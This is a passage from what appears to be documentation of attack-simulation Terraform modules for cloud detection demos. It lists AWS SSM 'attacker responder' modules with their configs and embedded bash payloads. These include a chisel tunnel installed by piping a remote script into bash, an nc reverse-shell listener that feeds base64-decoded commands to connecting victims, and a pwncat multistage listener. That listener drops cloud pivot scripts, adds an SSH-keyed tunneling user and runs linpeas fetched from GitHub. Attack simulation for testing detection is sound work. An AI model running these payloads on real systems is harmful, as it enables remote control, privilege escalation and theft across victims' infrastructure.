&quot;$APPLOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>        mv $APPLOG &quot;$APPLOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/http&#46;log &#45;S http &#45;m python3 &#45;c &quot;import base64; exec&&#35;40;base64&#46;b64decode&&#35;40;&&#35;x27;$&&#35;123;base64encode&&#35;40;local&#46;app&&#35;41;&&#35;125;&&#35;x27;&&#35;41;&&#35;41;&quot;<br/>        screen &#45;S http &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125; &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode&&#35;40;templatefile&&#35;40;<br/>                &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&#46;tpl&quot;,<br/>                &&#35;123;<br/>                    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                &&#35;125;&&#35;41;&&#35;41;<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| attacker-ssm-responder-port-forward                                        | ./modules/ssm/responder-port-forward                           | ssm_exec_responder_port_forward            | context.aws.ssm.attacker.responder.port_forward                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "port_forward": {<br/>                            "enabled": false,<br/>                            "listen_port": 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward                           | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        killall &#45;9 chisel<br/>        truncate &#45;s 0 /tmp/chisel&#46;log<br/>        log &quot;checking for chisel&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v chisel; do<br/>            log &quot;chisel not found &#45; installing&quot;<br/>            curl https://i&#46;jpillora&#46;com/chisel&#33; &#124; bash<br/>            sleep 10<br/>        done<br/>        log &quot;chisel: $&&#35;40;command &#45;v  chisel&&#35;41;&quot;<br/>        /usr/local/bin/chisel server &#45;v &#45;p $&&#35;123;local&#46;listen&&#35;95;port&&#35;125; &gt; /tmp/chisel&#46;log 2&gt;&amp;1 &amp;<br/>        log &quot;responder started&#46;&#46;&#46;&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-ssm-responder-reverse-shell                                       | ./modules/ssm/responder-reverse-shell                          | ssm_exec_responder_reverse_shell           | context.aws.ssm.attacker.responder.reverse_shell                          | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell": {<br/>                            "enabled": false,<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell                          | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    base64&&#35;95;command&&#35;95;payload = base64encode&&#35;40;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        screen &#45;S netcat &#45;X quit<br/>        screen &#45;wipe<br/>        truncate &#45;s 0 /tmp/netcat&#46;log<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/netcat&#46;log &#45;S netcat &#45;m nc &#45;vv &#45;nl $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125; $&&#35;123;local&#46;listen&&#35;95;port&&#35;125;<br/>        screen &#45;S netcat &#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started&#46;&#46;&quot;<br/>        until tail /tmp/netcat&#46;log &#124; grep &#45;m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection&#46;&#46;&#46;&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &&#35;x27;sending screen command: $&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;x27;;<br/>        screen &#45;S netcat &#45;p 0 &#45;X stuff &quot;echo &&#35;x27;$&&#35;123;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; /bin/bash &#45;^M&quot;<br/>        log &quot;responder started&#46;&#46;&#46;&quot;<br/>        log &&#35;x27;waiting 10 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 600<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-ssm-responder-reverse-shell-multistage                            | ./modules/ssm/responder-reverse-shell-multistage               | ssm_exec_reverse_shell_multistage_attacker | context.aws.ssm.attacker.responder.reverse_shell_multistage               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "responder": {<br/>                        "reverse_shell_multistage": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "iam2rds_role_name": "rds_user_access_role_ciemdemo",<br/>                            "iam2rds_session_name": "attacker-session",<br/>                            "listen_ip": "0.0.0.0",<br/>                            "listen_port": 4444,<br/>                            "payload": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files",<br/>                            "reverse_shell_host": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage               | <pre>locals &&#35;123;<br/>    listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>    listen&&#35;95;ip = var&#46;inputs&&#35;91;&quot;listen&&#35;95;ip&quot;&&#35;93;<br/>    attack&&#35;95;dir = &quot;/pwncat&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    PWNCAT&&#35;95;LOG=&quot;/tmp/pwncat&#46;log&quot;<br/>    PWNCAT&&#35;95;SESSION=&quot;pwncat&quot;<br/>    PWNCAT&&#35;95;SESSION&&#35;95;LOCK=&quot;/tmp/pwncat&&#35;95;session&#46;lock&quot;<br/>    if &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT&&#35;95;SESSION&&#35;95;LOCK exists and pwncat screen session running&#46; Skipping setup&#46;&quot;<br/>    else<br/>        rm &#45;f &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot;<br/>        log &quot;Session lock doesn&&#35;x27;t exist and screen session not runing&#46; Continuing&#46;&#46;&#46;&quot;<br/>        log &quot;setting up reverse shell listener: $&&#35;123;local&#46;listen&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>        screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>        screen &#45;wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/plugins $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/resources<br/>        cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;listener&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; listener&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;responder&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; plugins/responder&#46;py<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;instance2rds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/instance2rds&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iam2rds&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/iam2rds&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;azureiam2azuresql&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/azureiam2azuresql&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;gcpiam2cloudsql&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/gcpiam2cloudsql&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;scan2kubeshell&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/scan2kubeshell&#46;sh<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;kube2s3&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/kube2s3&#46;sh <br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iam2enum&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; resources/iam2enum&#46;sh<br/>        log &quot;installing required python3&#46;9&#46;&#46;&#46;&quot;<br/>        apt&#45;get install &#45;y python3&#46;9 python3&#46;9&#45;venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap&#46;pypa&#46;io/get&#45;pip&#46;py &#45;o get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 get&#45;pip&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        python3&#46;9 &#45;m pip install &#45;U pip setuptools wheel setuptools&&#35;95;rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3&#46;9 &#45;m pip install &#45;U pwncat&#45;cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module&#46;&#46;&#46;&quot;<br/>        sleep 5<br/>        if &#33; &&#35;91; &#45;e /home/socksuser/&#46;ssh/socksuser&&#35;95;key &&#35;93;; then<br/>            log &quot;adding tunneled port scanning user &#45; socksuser&#46;&#46;&#46;&quot;<br/>            adduser &#45;&#45;gecos &quot;&quot; &#45;&#45;disabled&#45;password &quot;socksuser&quot; &#124;&#124; log &quot;socksuser user already exists&quot;<br/>            log &quot;adding ssh keys for socks user&#46;&#46;&#46;&quot;<br/>            mkdir &#45;p /home/socksuser/&#46;ssh 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            ssh&#45;keygen &#45;t rsa &#45;N &&#35;x27;&&#35;x27; &#45;b 4096 &#45;f /home/socksuser/&#46;ssh/socksuser&&#35;95;key 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            cat /home/socksuser/&#46;ssh/socksuser&&#35;95;key&#46;pub &gt;&gt; /home/socksuser/&#46;ssh/authorized&&#35;95;keys 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            chown &#45;R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/&#46;ssh/authorized&&#35;95;keys 2&gt;&amp;1 &#124; tee &#45;a $LOGFILE<br/>            log &quot;socksuser setup complete&#46;&#46;&#46;&quot;<br/>        fi<br/>        START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>        while true; do<br/>            for i in &&#35;96;seq $&&#35;40;&&#35;40;MAXLOG&#45;1&&#35;41;&&#35;41; &#45;1 1&&#35;96;; do mv &quot;$PWNCAT&&#35;95;LOG&#46;&quot;&&#35;123;$i,$&&#35;40;&&#35;40;i&#43;1&&#35;41;&&#35;41;&&#35;125; 2&gt;/dev/null &#124;&#124; true; done<br/>            mv $PWNCAT&&#35;95;LOG &quot;$PWNCAT&&#35;95;LOG&#46;1&quot; 2&gt;/dev/null &#124;&#124; true<br/>            log &quot;starting background process via screen&#46;&#46;&#46;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X quit<br/>            screen &#45;wipe<br/>            screen &#45;d &#45;L &#45;Logfile $PWNCAT&&#35;95;LOG &#45;S $PWNCAT&&#35;95;SESSION &#45;m /bin/bash &#45;c &quot;cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; &amp;&amp; python3&#46;9 listener&#46;py &#45;&#45;port=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;port&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;host=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;reverse&&#35;95;shell&&#35;95;host&quot;&&#35;93;&&#35;125;&&#35;92;&quot; &#45;&#45;payload=&&#35;92;&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;&&#35;125;&&#35;92;&quot;&quot;<br/>            screen &#45;S $PWNCAT&&#35;95;SESSION &#45;X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;Checking for listener&#46;&#46;&#46;&quot;<br/>            TIMEOUT=1800<br/>            START&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>            while true; do<br/>                CURRENT&&#35;95;TIME=$&&#35;40;date &#43;%s&&#35;41;<br/>                ELAPSED&&#35;95;TIME=$&&#35;40;&&#35;40;CURRENT&&#35;95;TIME &#45; START&&#35;95;TIME&&#35;41;&&#35;41;<br/>                if grep &quot;listener created&quot; $PWNCAT&&#35;95;LOG; then<br/>                    log &quot;Found listener created log in $PWNCAT&&#35;95;LOG &#45; checking for port response&quot;<br/>                    while &#33; nc &#45;z &#45;w 5 &#45;vv 127&#46;0&#46;0&#46;1 $&&#35;123;local&#46;listen&&#35;95;port&&#35;125; &gt; /dev/null; do<br/>                        log &quot;failed check &#45; waiting for pwncat port response: 127&#46;0&#46;0&#46;1:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;;<br/>                        sleep 30;<br/>                        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log &quot;Sucessfully connected to 127&#46;0&#46;0&#46;1:$&&#35;123;local&#46;listen&&#35;95;port&&#35;125;&quot;<br/>                    break<br/>                fi<br/>                if &&#35;91; $ELAPSED&&#35;95;TIME &#45;gt $TIMEOUT &&#35;93;; then<br/>                    log &quot;Failed to find listener created log for pwncat &#45; timeout after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>            done<br/>            log &quot;responder started&#46;&quot;<br/>            log &quot;starting sleep for 30 minutes &#45; blocking new tasks while accepting connections&#46;&#46;&#46;&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete &#45; checking for running sessions&#46;&#46;&#46;&quot;<br/>            while &&#35;91; &#45;e &quot;$PWNCAT&&#35;95;SESSION&&#35;95;LOCK&quot; &&#35;93;  &amp;&amp; screen &#45;ls &#124; grep &#45;q &quot;$PWNCAT&&#35;95;SESSION&quot;; do<br/>                log &quot;pwncat session still running &#45; waiting before restart&#46;&#46;&#46;&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found &#45; continuing&#46;&#46;&#46;&quot;<br/>            if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>                log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>                rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            